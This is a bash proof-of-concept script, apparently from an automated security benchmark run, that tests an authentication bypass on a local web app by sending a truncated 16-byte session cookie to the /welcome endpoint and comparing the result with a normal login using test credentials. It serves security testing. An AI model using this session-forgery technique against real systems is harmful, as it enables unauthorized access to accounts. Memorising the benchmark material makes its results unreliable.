#!/bin/bash
# POC: Authentication bypass through session manipulation by providing truncated 16-byte session cookies instead of expected 32-byte format, gaining access to protected /welcome endpoint
# Target: ./repo
# Created: 2025-12-01T16:15:19.990Z
# Session: benchmark-XBEN-103-24-mincfo1r

# Authentication Bypass via Session Manipulation POC
# Tests whether the /welcome endpoint can be accessed with truncated session cookies

TARGET="${1:-http://127.0.0.1:8000}"
WELCOME_ENDPOINT="$TARGET/welcome"

echo "[*] Authentication Bypass via Session Manipulation POC"
echo "[*] Target: $TARGET"
echo ""

# Test 1: Without session - should be rejected
echo "[Test 1] Accessing /welcome without session cookie"
echo "Command: curl -i '$WELCOME_ENDPOINT'"
RESPONSE=$(curl -i "$WELCOME_ENDPOINT" 2>/dev/null)
STATUS=$(echo "$RESPONSE" | head -n 1)
echo "Response Status: $STATUS"
if echo "$RESPONSE" | grep -q "302\|301"; then
    echo "[+] Test 1 PASSED: Properly rejected without session (HTTP 302/301 redirect)"
else
    echo "[-] Test 1 FAILED: Should have been redirected"
fi
echo ""

# Test 2: With truncated 16-byte session (authentication bypass)
echo "[Test 2] Accessing /welcome with truncated 16-byte session cookie"
TRUNCATED_SESSION="74657374310000000000000000000000"
echo "Command: curl -i -b 'session=$TRUNCATED_SESSION' '$WELCOME_ENDPOINT'"
RESPONSE=$(curl -i -b "session=$TRUNCATED_SESSION" "$WELCOME_ENDPOINT" 2>/dev/null)
STATUS=$(echo "$RESPONSE" | head -n 1)
BODY=$(echo "$RESPONSE" | tail -n 20)
echo "Response Status: $STATUS"
echo "Response Body (last 20 lines):"
echo "$BODY"
echo ""

if echo "$RESPONSE" | grep -q "200"; then
    if echo "$BODY" | grep -q "Welcome"; then
        echo "[!] VULNERABILITY CONFIRMED: Truncated session accepted!"
        echo "[!] Application granted access with HTTP 200 despite truncated session"
        echo "[!] This indicates authentication bypass or weak session validation"
        
        # Check if username is empty
        if echo "$BODY" | grep -q "Welcome, !"; then
            echo "[!] Username is empty, confirming invalid decryption but still granted access"
            exit 0  # POC successful
        elif echo "$BODY" | grep -q "Welcome,"; then
            echo "[!] Welcome page returned with truncated session"
            exit 0  # POC successful
        fi
    fi
else
    echo "[-] Test 2: Truncated session was rejected (not vulnerable)"
fi
echo ""

# Test 3: With valid 32-byte session (if available from test credentials)
echo "[Test 3] Attempting login to get valid session"
LOGIN_RESPONSE=$(curl -s -X POST "$TARGET/login" \
    -H "Content-Type: application/x-www-form-urlencoded" \
    -d "username=test1&password=test1" 2>/dev/null)

# Extract session cookie from Set-Cookie header
SESSION_COOKIE=$(curl -i -X POST "$TARGET/login" \
    -H "Content-Type: application/x-www-form-urlencoded" \
    -d "username=test1&password=test1" 2>/dev/null | grep -i "set-cookie" | grep -oP 'session=[^;]+' | cut -d'=' -f2)

if [ -n "$SESSION_COOKIE" ]; then
    echo "[+] Valid session obtained: ${SESSION_COOKIE:0:16}..."
    VALID_LENGTH=${#SESSION_COOKIE}
    echo "[*] Valid session length: $VALID_LENGTH bytes"
    
    # Access with valid session
    echo "[Test 3a] Accessing /welcome with valid session"
    RESPONSE=$(curl -i -b "session=$SESSION_COOKIE" "$WELCOME_ENDPOINT" 2>/dev/null)
    if echo "$RESPONSE" | grep -q "Welcome, test1"; then
        echo "[+] Valid session works correctly"
    fi
fi
echo ""

echo "[*] POC Complete"
echo "[*] Conclusion: If truncated session was accepted (HTTP 200), authentication bypass is confirmed"